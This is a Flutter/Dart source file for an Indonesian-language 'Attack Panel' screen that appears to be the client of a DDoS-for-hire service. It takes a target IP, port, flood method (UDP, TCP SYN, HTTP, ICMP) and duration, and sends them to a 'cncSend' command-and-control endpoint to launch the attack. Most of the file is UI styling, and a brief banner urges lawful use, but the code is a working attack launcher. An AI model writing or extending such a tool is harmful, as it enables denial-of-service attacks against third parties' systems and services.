import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'api_config.dart';

// ─── Palette ──────────────────────────────────────────────────────────────────
class _C {
  static const bg        = Color(0xFF060B14);
  static const surface   = Color(0xFF0C1424);
  static const card      = Color(0xFF101A2E);
  static const border    = Color(0xFF1A2D4A);
  static const borderLit = Color(0xFF1E3A5F);

  static const blue      = Color(0xFF1B6FBD);
  static const blueMid   = Color(0xFF2D8FE8);
  static const blueLight = Color(0xFF56AEF5);
  static const blueFrost = Color(0xFF90CEF7);

  static const red       = Color(0xFFEF4444);
  static const redGlow   = Color(0xFFDC2626);
  static const amber     = Color(0xFFF59E0B);
  static const green     = Color(0xFF22C55E);

  static const text      = Color(0xFFE2EDF9);
  static const textSub   = Color(0xFF7A9BBF);
  static const textDim   = Color(0xFF3A5470);

  static const LinearGradient btnGrad = LinearGradient(
    colors: [blueMid, blueLight],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  static const LinearGradient launchGrad = LinearGradient(
    colors: [Color(0xFFDC2626), Color(0xFFEF4444), Color(0xFFF97316)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
}

class AttackPanel extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> listDoos;

  const AttackPanel({
    super.key,
    required this.sessionKey,
    required this.listDoos,
  });

  @override
  State<AttackPanel> createState() => _AttackPanelState();
}

class _AttackPanelState extends State<AttackPanel>
    with TickerProviderStateMixin {
  final targetCtrl = TextEditingController();
  final portCtrl   = TextEditingController();

  String selectedDoosId = "";
  double attackDuration = 60;
  bool _isSending = false;

  // Animations
  late AnimationController _bgCtrl;
  late AnimationController _radarCtrl;
  late AnimationController _entranceCtrl;
  late AnimationController _btnPulseCtrl;
  late AnimationController _sendingCtrl;

  late Animation<double> _formFade;
  late Animation<Offset>  _formSlide;
  late Animation<double>  _btnScale;
  late Animation<double>  _btnGlow;
  late Animation<double>  _sending;

  @override
  void initState() {
    super.initState();

    if (widget.listDoos.isNotEmpty) {
      selectedDoosId = widget.listDoos[0]['ddos_id'];
    }

    _bgCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 20))
      ..repeat();

    _radarCtrl = AnimationController(
        vsync: this, duration: const Duration(seconds: 3))
      ..repeat();

    _entranceCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 850));
    _formFade  = CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOut);
    _formSlide = Tween<Offset>(begin: const Offset(0, 0.06), end: Offset.zero)
        .animate(CurvedAnimation(parent: _entranceCtrl, curve: Curves.easeOutCubic));

    _btnPulseCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 1600))
      ..repeat(reverse: true);
    _btnScale = Tween<double>(begin: 1.0, end: 1.04)
        .animate(CurvedAnimation(parent: _btnPulseCtrl, curve: Curves.easeInOut));
    _btnGlow  = Tween<double>(begin: 0.3, end: 0.7)
        .animate(CurvedAnimation(parent: _btnPulseCtrl, curve: Curves.easeInOut));

    _sendingCtrl = AnimationController(
        vsync: this, duration: const Duration(milliseconds: 900))
      ..repeat();
    _sending = CurvedAnimation(parent: _sendingCtrl, curve: Curves.easeInOut);

    _entranceCtrl.forward();
  }

  @override
  void dispose() {
    _bgCtrl.dispose();
    _radarCtrl.dispose();
    _entranceCtrl.dispose();
    _btnPulseCtrl.dispose();
    _sendingCtrl.dispose();
    targetCtrl.dispose();
    portCtrl.dispose();
    super.dispose();
  }

  // ─── API ────────────────────────────────────────────────────────────────────
  Future<void> _sendDoos() async {
    final target   = targetCtrl.text.trim();
    final port     = portCtrl.text.trim();
    final key      = widget.sessionKey;
    final duration = attackDuration.toInt();
    final isIcmp   = selectedDoosId.toLowerCase() == 'icmp';

    if (target.isEmpty) {
      _showResult('Input Tidak Valid', 'Target IP tidak boleh kosong.', type: _ResultType.error);
      return;
    }
    if (!isIcmp && (port.isEmpty || int.tryParse(port) == null)) {
      _showResult('Port Tidak Valid', 'Masukkan port yang valid.', type: _ResultType.warning);
      return;
    }

    setState(() => _isSending = true);
    try {
      final uri = Uri.parse(
          '$baseUrl/cncSend?key=$key&target=$target&ddos=$selectedDoosId'
          '&port=${port.isEmpty ? 0 : port}&duration=$duration');
      final res  = await http.get(uri);
      final data = jsonDecode(res.body);

      if (data['cooldown'] == true) {
        _showResult('Cooldown Aktif', 'Tunggu sebentar sebelum mengirim lagi.', type: _ResultType.warning);
      } else if (data['valid'] == false) {
        _showResult('Sesi Tidak Valid', 'Session key tidak valid. Silakan login ulang.', type: _ResultType.error);
      } else if (data['sended'] == false) {
        _showResult('Gagal Terkirim', 'Gagal mengirim serangan. Server mungkin sedang maintenance.', type: _ResultType.error);
      } else {
        _showResult('Berhasil Diluncurkan', 'Serangan berhasil dikirim ke $target.', type: _ResultType.success);
      }
    } catch (_) {
      _showResult('Koneksi Error', 'Terjadi kesalahan. Coba lagi.', type: _ResultType.error);
    } finally {
      if (mounted) setState(() => _isSending = false);
    }
  }

  // ─── Result dialog ────────────────────────────────────────────────────────
  void _showResult(String title, String message, {required _ResultType type}) {
    final color = switch (type) {
      _ResultType.success => _C.green,
      _ResultType.warning => _C.amber,
      _ResultType.error   => _C.red,
    };
    final icon = switch (type) {
      _ResultType.success => Icons.check_rounded,
      _ResultType.warning => Icons.warning_amber_rounded,
      _ResultType.error   => Icons.close_rounded,
    };

    showGeneralDialog(
      context: context,
      barrierDismissible: true,
      barrierLabel: '',
      barrierColor: Colors.black87,
      transitionDuration: const Duration(milliseconds: 320),
      transitionBuilder: (_, anim, __, child) => ScaleTransition(
        scale: CurvedAnimation(parent: anim, curve: Curves.easeOutBack),
        child: FadeTransition(opacity: anim, child: child),
      ),
      pageBuilder: (ctx, _, __) => Dialog(
        backgroundColor: Colors.transparent,
        insetPadding: const EdgeInsets.symmetric(horizontal: 28),
        child: Container(
          decoration: BoxDecoration(
            color: _C.card,
            borderRadius: BorderRadius.circular(24),
            border: Border.all(color: color.withOpacity(0.3), width: 1.5),
            boxShadow: [BoxShadow(color: color.withOpacity(0.15), blurRadius: 50)],
          ),
          padding: const EdgeInsets.all(28),
          child: Column(mainAxisSize: MainAxisSize.min, children: [
            Container(
              width: 56, height: 56,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: color.withOpacity(0.1),
                border: Border.all(color: color.withOpacity(0.3)),
              ),
              child: Icon(icon, color: color, size: 28),
            ),
            const SizedBox(height: 16),
            Text(title,
                style: const TextStyle(color: _C.text, fontSize: 18,
                    fontWeight: FontWeight.w800)),
            const SizedBox(height: 8),
            Text(message,
                textAlign: TextAlign.center,
                style: const TextStyle(color: _C.textSub, fontSize: 13, height: 1.5)),
            const SizedBox(height: 24),
            _GradBtn(label: 'OK', fullWidth: true, onTap: () => Navigator.pop(ctx)),
          ]),
        ),
      ),
    );
  }

  // ─── Build ────────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    final isIcmp = selectedDoosId.toLowerCase() == 'icmp';

    return Scaffold(
      backgroundColor: _C.bg,
      extendBodyBehindAppBar: true,
      appBar: _buildAppBar(),
      body: Stack(
        children: [
          Positioned.fill(child: _AnimatedBg(controller: _bgCtrl)),
          SafeArea(
            child: FadeTransition(
              opacity: _formFade,
              child: SlideTransition(
                position: _formSlide,
                child: SingleChildScrollView(
                  physics: const BouncingScrollPhysics(),
                  padding: const EdgeInsets.fromLTRB(20, 8, 20, 40),
                  child: Column(
                    children: [
                      const SizedBox(height: 8),
                      _buildRadarHero(),
                      const SizedBox(height: 28),
                      _buildTargetCard(isIcmp),
                      const SizedBox(height: 14),
                      _buildDurationCard(),
                      const SizedBox(height: 14),
                      _buildMethodCard(),
                      const SizedBox(height: 32),
                      _buildLaunchButton(),
                      const SizedBox(height: 16),
                      _buildWarningBanner(),
                    ],
                  ),
                ),
              ),
            ),
          ),
        ],
      ),
    );
  }

  PreferredSizeWidget _buildAppBar() {
    return AppBar(
      backgroundColor: Colors.transparent,
      elevation: 0,
      leading: _BackBtn(onTap: () => Navigator.pop(context)),
      title: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Container(
            width: 8, height: 8,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              color: _C.red,
              boxShadow: [BoxShadow(color: _C.red.withOpacity(0.6), blurRadius: 8)],
            ),
          ),
          const SizedBox(width: 10),
          const Text('Attack Panel',
              style: TextStyle(
                  color: _C.text, fontSize: 17, fontWeight: FontWeight.w700)),
        ],
      ),
      centerTitle: true,
    );
  }

  // ─── Radar Hero ───────────────────────────────────────────────────────────
  Widget _buildRadarHero() {
    return AnimatedBuilder(
      animation: _radarCtrl,
      builder: (_, __) => SizedBox(
        width: 140, height: 140,
        child: CustomPaint(
          painter: _RadarPainter(_radarCtrl.value),
          child: Center(
            child: Container(
              width: 60, height: 60,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: const LinearGradient(
                  colors: [_C.redGlow, _C.red],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                boxShadow: [
                  BoxShadow(
                    color: _C.red.withOpacity(0.5),
                    blurRadius: 20,
                    spreadRadius: 2,
                  ),
                ],
              ),
              child: const Icon(Icons.bolt_rounded, color: Colors.white, size: 28),
            ),
          ),
        ),
      ),
    );
  }

  // ─── Target + Port card ────────────────────────────────────────────────────
  Widget _buildTargetCard(bool isIcmp) {
    return _SectionCard(
      icon: Icons.gps_fixed_rounded,
      title: 'Target',
      subtitle: 'IP address & port tujuan',
      accentColor: _C.red,
      children: [
        _FieldLabel('Target IP'),
        const SizedBox(height: 6),
        _AttackInput(
          controller: targetCtrl,
          hint: 'e.g. 192.168.1.1',
          icon: Icons.computer_rounded,
          keyboardType: TextInputType.text,
        ),
        const SizedBox(height: 14),
        _FieldLabel('Port ${isIcmp ? '(ICMP — tidak diperlukan)' : ''}'),
        const SizedBox(height: 6),
        _AttackInput(
          controller: portCtrl,
          hint: isIcmp ? 'Dinonaktifkan untuk ICMP' : 'e.g. 80',
          icon: Icons.settings_ethernet_rounded,
          enabled: !isIcmp,
          keyboardType: TextInputType.number,
        ),
      ],
    );
  }

  // ─── Duration card ────────────────────────────────────────────────────────
  Widget _buildDurationCard() {
    return _SectionCard(
      icon: Icons.timer_rounded,
      title: 'Durasi Serangan',
      subtitle: 'Berapa lama serangan berlangsung',
      accentColor: _C.amber,
      children: [
        Row(children: [
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 8),
            decoration: BoxDecoration(
              color: _C.amber.withOpacity(0.1),
              borderRadius: BorderRadius.circular(10),
              border: Border.all(color: _C.amber.withOpacity(0.3)),
            ),
            child: Text(
              '${attackDuration.toInt()} detik',
              style: const TextStyle(
                  color: _C.amber, fontSize: 16, fontWeight: FontWeight.w800),
            ),
          ),
          const SizedBox(width: 12),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                _DurationBar(value: (attackDuration - 10) / 290),
                const SizedBox(height: 4),
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: const [
                    Text('10s', style: TextStyle(color: _C.textDim, fontSize: 10)),
                    Text('300s', style: TextStyle(color: _C.textDim, fontSize: 10)),
                  ],
                ),
              ],
            ),
          ),
        ]),
        const SizedBox(height: 8),
        SliderTheme(
          data: SliderThemeData(
            trackHeight: 3,
            activeTrackColor: _C.amber,
            inactiveTrackColor: _C.border,
            thumbColor: _C.amber,
            thumbShape: const RoundSliderThumbShape(enabledThumbRadius: 8),
            overlayShape: const RoundSliderOverlayShape(overlayRadius: 18),
            overlayColor: _C.amber.withOpacity(0.15),
          ),
          child: Slider(
            value: attackDuration,
            min: 10,
            max: 300,
            divisions: 29,
            onChanged: (v) => setState(() => attackDuration = v),
          ),
        ),
      ],
    );
  }

  // ─── Method card ──────────────────────────────────────────────────────────
  Widget _buildMethodCard() {
    return _SectionCard(
      icon: Icons.flash_on_rounded,
      title: 'Metode Serangan',
      subtitle: 'Pilih protokol / vektor DDoS',
      accentColor: _C.blueLight,
      children: [
        Container(
          padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 4),
          decoration: BoxDecoration(
            color: _C.surface,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _C.border),
          ),
          child: DropdownButtonHideUnderline(
            child: DropdownButton<String>(
              value: selectedDoosId,
              isExpanded: true,
              dropdownColor: _C.card,
              icon: const Icon(Icons.expand_more_rounded,
                  color: _C.textSub, size: 20),
              style: const TextStyle(
                  color: _C.text, fontSize: 14, fontWeight: FontWeight.w500),
              items: widget.listDoos.map((doos) {
                final id = doos['ddos_id'] as String;
                return DropdownMenuItem<String>(
                  value: id,
                  child: Row(children: [
                    Container(
                      width: 8, height: 8,
                      decoration: BoxDecoration(
                        shape: BoxShape.circle,
                        color: _methodColor(id),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Text(doos['ddos_name'],
                        style: const TextStyle(color: _C.text)),
                  ]),
                );
              }).toList(),
              onChanged: (v) => setState(() => selectedDoosId = v!),
            ),
          ),
        ),

        // Method info chip
        const SizedBox(height: 12),
        _MethodChip(id: selectedDoosId),
      ],
    );
  }

  // ─── Launch button ────────────────────────────────────────────────────────
  Widget _buildLaunchButton() {
    return AnimatedBuilder(
      animation: _btnPulseCtrl,
      builder: (_, __) => Transform.scale(
        scale: _isSending ? 1.0 : _btnScale.value,
        child: GestureDetector(
          onTap: _isSending ? null : _sendDoos,
          child: Container(
            width: double.infinity,
            height: 58,
            decoration: BoxDecoration(
              gradient: const LinearGradient(
                colors: [Color(0xFFDC2626), Color(0xFFEF4444), Color(0xFFF97316)],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(18),
              boxShadow: [
                BoxShadow(
                  color: _C.red.withOpacity(
                      _isSending ? 0.2 : _btnGlow.value * 0.55),
                  blurRadius: 24,
                  offset: const Offset(0, 6),
                ),
              ],
            ),
            child: AnimatedSwitcher(
              duration: const Duration(milliseconds: 250),
              child: _isSending
                  ? const Row(
                      key: ValueKey('sending'),
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        SizedBox(
                          width: 18, height: 18,
                          child: CircularProgressIndicator(
                              strokeWidth: 2.5, color: Colors.white),
                        ),
                        SizedBox(width: 12),
                        Text('Meluncurkan...',
                            style: TextStyle(
                                color: Colors.white,
                                fontWeight: FontWeight.w700,
                                fontSize: 15)),
                      ],
                    )
                  : const Row(
                      key: ValueKey('idle'),
                      mainAxisAlignment: MainAxisAlignment.center,
                      children: [
                        Icon(Icons.bolt_rounded, color: Colors.white, size: 22),
                        SizedBox(width: 10),
                        Text('LUNCURKAN SERANGAN',
                            style: TextStyle(
                              color: Colors.white,
                              fontWeight: FontWeight.w800,
                              fontSize: 15,
                              letterSpacing: 0.8,
                            )),
                      ],
                    ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildWarningBanner() {
    return Container(
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _C.red.withOpacity(0.05),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: _C.red.withOpacity(0.2)),
      ),
      child: const Row(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Icon(Icons.warning_amber_rounded, color: _C.red, size: 16),
          SizedBox(width: 10),
          Expanded(
            child: Text(
              'Gunakan hanya untuk tujuan yang sah dan dengan izin pemilik sistem. '
              'Penyalahgunaan dapat melanggar hukum.',
              style: TextStyle(
                  color: _C.textSub, fontSize: 11, height: 1.5),
            ),
          ),
        ],
      ),
    );
  }
}

// ─── Method color ─────────────────────────────────────────────────────────────
Color _methodColor(String id) {
  final lower = id.toLowerCase();
  if (lower.contains('udp'))  return const Color(0xFFF59E0B);
  if (lower.contains('tcp'))  return const Color(0xFF3B82F6);
  if (lower.contains('http')) return const Color(0xFF10B981);
  if (lower.contains('icmp')) return const Color(0xFFA78BFA);
  return _C.blueLight;
}

// ─── Method chip ──────────────────────────────────────────────────────────────
class _MethodChip extends StatelessWidget {
  final String id;
  const _MethodChip({required this.id});

  String get _desc {
    final lower = id.toLowerCase();
    if (lower.contains('udp'))  return 'UDP Flood — mengirim banyak paket UDP ke target';
    if (lower.contains('tcp'))  return 'TCP SYN Flood — membanjiri koneksi TCP';
    if (lower.contains('http')) return 'HTTP Flood — request masif ke web server';
    if (lower.contains('icmp')) return 'ICMP Ping Flood — tidak memerlukan port';
    return 'Metode serangan terpilih';
  }

  @override
  Widget build(BuildContext context) {
    final color = _methodColor(id);
    return AnimatedContainer(
      duration: const Duration(milliseconds: 250),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: color.withOpacity(0.07),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: color.withOpacity(0.25)),
      ),
      child: Row(children: [
        Icon(Icons.info_outline_rounded, color: color, size: 14),
        const SizedBox(width: 8),
        Expanded(child: Text(_desc,
            style: TextStyle(color: color.withOpacity(0.9), fontSize: 11, height: 1.4))),
      ]),
    );
  }
}

// ─── Duration bar ─────────────────────────────────────────────────────────────
class _DurationBar extends StatelessWidget {
  final double value;
  const _DurationBar({required this.value});

  @override
  Widget build(BuildContext context) {
    return ClipRRect(
      borderRadius: BorderRadius.circular(3),
      child: Stack(children: [
        Container(height: 4, color: _C.border),
        AnimatedContainer(
          duration: const Duration(milliseconds: 200),
          height: 4,
          width: (MediaQuery.of(context).size.width - 200) * value,
          decoration: BoxDecoration(
            gradient: const LinearGradient(
              colors: [_C.amber, Color(0xFFF97316)],
            ),
            borderRadius: BorderRadius.circular(3),
            boxShadow: [BoxShadow(color: _C.amber.withOpacity(0.5), blurRadius: 6)],
          ),
        ),
      ]),
    );
  }
}

// ─── Section Card ─────────────────────────────────────────────────────────────
class _SectionCard extends StatelessWidget {
  final IconData icon;
  final String title;
  final String subtitle;
  final Color accentColor;
  final List<Widget> children;

  const _SectionCard({
    required this.icon,
    required this.title,
    required this.subtitle,
    required this.accentColor,
    required this.children,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        color: _C.card,
        borderRadius: BorderRadius.circular(20),
        border: Border.all(color: _C.border),
        boxShadow: [
          BoxShadow(
            color: accentColor.withOpacity(0.06),
            blurRadius: 24,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.stretch,
        children: [
          // Header
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 14),
            decoration: BoxDecoration(
              border: Border(bottom: BorderSide(color: _C.border.withOpacity(0.6))),
            ),
            child: Row(children: [
              Container(
                width: 36, height: 36,
                decoration: BoxDecoration(
                  color: accentColor.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(10),
                  border: Border.all(color: accentColor.withOpacity(0.25)),
                ),
                child: Icon(icon, color: accentColor, size: 17),
              ),
              const SizedBox(width: 12),
              Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
                Text(title,
                    style: const TextStyle(color: _C.text, fontSize: 14,
                        fontWeight: FontWeight.w700)),
                Text(subtitle,
                    style: const TextStyle(color: _C.textSub, fontSize: 11)),
              ]),
            ]),
          ),
          Padding(
            padding: const EdgeInsets.all(18),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: children,
            ),
          ),
        ],
      ),
    );
  }
}

// ─── Attack Input ─────────────────────────────────────────────────────────────
class _AttackInput extends StatefulWidget {
  final TextEditingController controller;
  final String hint;
  final IconData icon;
  final bool enabled;
  final TextInputType keyboardType;

  const _AttackInput({
    required this.controller,
    required this.hint,
    required this.icon,
    this.enabled = true,
    this.keyboardType = TextInputType.text,
  });

  @override
  State<_AttackInput> createState() => _AttackInputState();
}

class _AttackInputState extends State<_AttackInput> {
  bool _focused = false;
  final _focus = FocusNode();

  @override
  void initState() {
    super.initState();
    _focus.addListener(() => setState(() => _focused = _focus.hasFocus));
  }

  @override
  void dispose() { _focus.dispose(); super.dispose(); }

  @override
  Widget build(BuildContext context) {
    return AnimatedContainer(
      duration: const Duration(milliseconds: 200),
      decoration: BoxDecoration(
        color: widget.enabled ? _C.surface : _C.surface.withOpacity(0.5),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: _focused ? _C.blueMid : _C.border,
          width: _focused ? 1.5 : 1.0,
        ),
        boxShadow: _focused
            ? [BoxShadow(color: _C.blueMid.withOpacity(0.1),
                blurRadius: 12, offset: const Offset(0, 4))]
            : [],
      ),
      child: TextField(
        controller: widget.controller,
        focusNode: _focus,
        enabled: widget.enabled,
        keyboardType: widget.keyboardType,
        style: TextStyle(
            color: widget.enabled ? _C.text : _C.textDim,
            fontSize: 14, fontWeight: FontWeight.w500),
        cursorColor: _C.blueMid,
        decoration: InputDecoration(
          hintText: widget.hint,
          hintStyle: const TextStyle(color: _C.textDim, fontSize: 13),
          prefixIcon: Icon(widget.icon,
              color: widget.enabled ? (_focused ? _C.blueLight : _C.textSub) : _C.textDim,
              size: 18),
          border: InputBorder.none,
          contentPadding:
              const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        ),
      ),
    );
  }
}

// ─── Field Label ──────────────────────────────────────────────────────────────
class _FieldLabel extends StatelessWidget {
  final String text;
  const _FieldLabel(this.text);

  @override
  Widget build(BuildContext context) {
    return Text(text,
        style: const TextStyle(
            color: _C.textSub, fontSize: 12, fontWeight: FontWeight.w600));
  }
}

// ─── Radar Painter ────────────────────────────────────────────────────────────
class _RadarPainter extends CustomPainter {
  final double t;
  _RadarPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final cx = size.width  / 2;
    final cy = size.height / 2;
    final maxR = size.width / 2;

    // Grid rings
    for (int i = 1; i <= 3; i++) {
      final r = maxR * i / 3;
      canvas.drawCircle(
        Offset(cx, cy),
        r,
        Paint()
          ..color = _C.red.withOpacity(0.12)
          ..style = PaintingStyle.stroke
          ..strokeWidth = 1,
      );
    }

    // Crosshair
    final crossPaint = Paint()
      ..color = _C.red.withOpacity(0.15)
      ..strokeWidth = 0.8;
    canvas.drawLine(Offset(cx, cy - maxR), Offset(cx, cy + maxR), crossPaint);
    canvas.drawLine(Offset(cx - maxR, cy), Offset(cx + maxR, cy), crossPaint);

    // Sweep arc
    final sweepAngle = t * math.pi * 2;
    final sweepPaint = Paint()
      ..shader = SweepGradient(
        startAngle: sweepAngle - 1.2,
        endAngle: sweepAngle,
        colors: [Colors.transparent, _C.red.withOpacity(0.5)],
      ).createShader(Rect.fromCircle(center: Offset(cx, cy), radius: maxR))
      ..style = PaintingStyle.fill;
    canvas.drawArc(
      Rect.fromCircle(center: Offset(cx, cy), radius: maxR),
      sweepAngle - 1.2,
      1.2,
      true,
      sweepPaint,
    );

    // Sweep line
    final sweepLine = Paint()
      ..color = _C.red.withOpacity(0.8)
      ..strokeWidth = 1.5;
    canvas.drawLine(
      Offset(cx, cy),
      Offset(cx + math.cos(sweepAngle) * maxR,
             cy + math.sin(sweepAngle) * maxR),
      sweepLine,
    );

    // Random blip dots that "appear" when sweep passes
    final rand = math.Random(42);
    for (int i = 0; i < 4; i++) {
      final angle  = rand.nextDouble() * math.pi * 2;
      final dist   = rand.nextDouble() * maxR * 0.8 + maxR * 0.1;
      final blipX  = cx + math.cos(angle) * dist;
      final blipY  = cy + math.sin(angle) * dist;

      // Fade based on how far behind the sweep this blip is
      final diff   = (sweepAngle - angle) % (math.pi * 2);
      final opacity = math.max(0.0, 1.0 - diff / (math.pi * 2));

      if (opacity > 0.05) {
        canvas.drawCircle(
          Offset(blipX, blipY),
          3,
          Paint()..color = _C.red.withOpacity(opacity * 0.9),
        );
        canvas.drawCircle(
          Offset(blipX, blipY),
          6,
          Paint()
            ..color = _C.red.withOpacity(opacity * 0.3)
            ..style = PaintingStyle.stroke
            ..strokeWidth = 1,
        );
      }
    }
  }

  @override
  bool shouldRepaint(_RadarPainter old) => old.t != t;
}

// ─── Animated Background ──────────────────────────────────────────────────────
class _AnimatedBg extends StatelessWidget {
  final AnimationController controller;
  const _AnimatedBg({required this.controller});

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: controller,
      builder: (_, __) =>
          CustomPaint(painter: _BgPainter(controller.value)),
    );
  }
}

class _BgPainter extends CustomPainter {
  final double t;
  _BgPainter(this.t);

  @override
  void paint(Canvas canvas, Size size) {
    final grid = Paint()
      ..color = _C.border.withOpacity(0.25)
      ..strokeWidth = 0.5;
    const step = 38.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), grid);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), grid);
    }
    final glow = Paint()
      ..shader = RadialGradient(colors: [
        _C.red.withOpacity(0.07 + math.sin(t * math.pi * 2) * 0.02),
        Colors.transparent,
      ], radius: 0.8).createShader(Rect.fromCircle(
          center: Offset(size.width / 2, size.height * 0.2),
          radius: size.width * 0.6));
    canvas.drawCircle(
        Offset(size.width / 2, size.height * 0.2), size.width * 0.6, glow);
  }

  @override
  bool shouldRepaint(_BgPainter old) => old.t != t;
}

// ─── Shared: Back Button ──────────────────────────────────────────────────────
class _BackBtn extends StatefulWidget {
  final VoidCallback onTap;
  const _BackBtn({required this.onTap});

  @override
  State<_BackBtn> createState() => _BackBtnState();
}

class _BackBtnState extends State<_BackBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(8),
      child: GestureDetector(
        onTapDown: (_) => setState(() => _down = true),
        onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
        onTapCancel: () => setState(() => _down = false),
        child: AnimatedContainer(
          duration: const Duration(milliseconds: 120),
          decoration: BoxDecoration(
            color: _down ? _C.border : _C.surface,
            borderRadius: BorderRadius.circular(11),
            border: Border.all(color: _C.border),
          ),
          child: const Icon(Icons.arrow_back_ios_new_rounded,
              color: _C.textSub, size: 16),
        ),
      ),
    );
  }
}

// ─── Shared: GradBtn ──────────────────────────────────────────────────────────
class _GradBtn extends StatefulWidget {
  final String label;
  final VoidCallback onTap;
  final bool fullWidth;
  final LinearGradient gradient;

  const _GradBtn({
    required this.label,
    required this.onTap,
    this.fullWidth = false,
    this.gradient = _C.btnGrad,
  });

  @override
  State<_GradBtn> createState() => _GradBtnState();
}

class _GradBtnState extends State<_GradBtn> {
  bool _down = false;

  @override
  Widget build(BuildContext context) {
    return GestureDetector(
      onTapDown: (_) => setState(() => _down = true),
      onTapUp: (_) { setState(() => _down = false); widget.onTap(); },
      onTapCancel: () => setState(() => _down = false),
      child: AnimatedScale(
        scale: _down ? 0.96 : 1.0,
        duration: const Duration(milliseconds: 120),
        child: Container(
          height: 46,
          width: widget.fullWidth ? double.infinity : null,
          padding: widget.fullWidth
              ? EdgeInsets.zero
              : const EdgeInsets.symmetric(horizontal: 28),
          decoration: BoxDecoration(
            gradient: widget.gradient,
            borderRadius: BorderRadius.circular(13),
            boxShadow: _down ? [] : [
              BoxShadow(color: _C.blueMid.withOpacity(0.3),
                  blurRadius: 14, offset: const Offset(0, 4)),
            ],
          ),
          child: Center(
            child: Text(widget.label,
                style: const TextStyle(
                    color: Colors.white,
                    fontWeight: FontWeight.w700,
                    fontSize: 14)),
          ),
        ),
      ),
    );
  }
}

// ─── Result type ──────────────────────────────────────────────────────────────
enum _ResultType { success, warning, error }
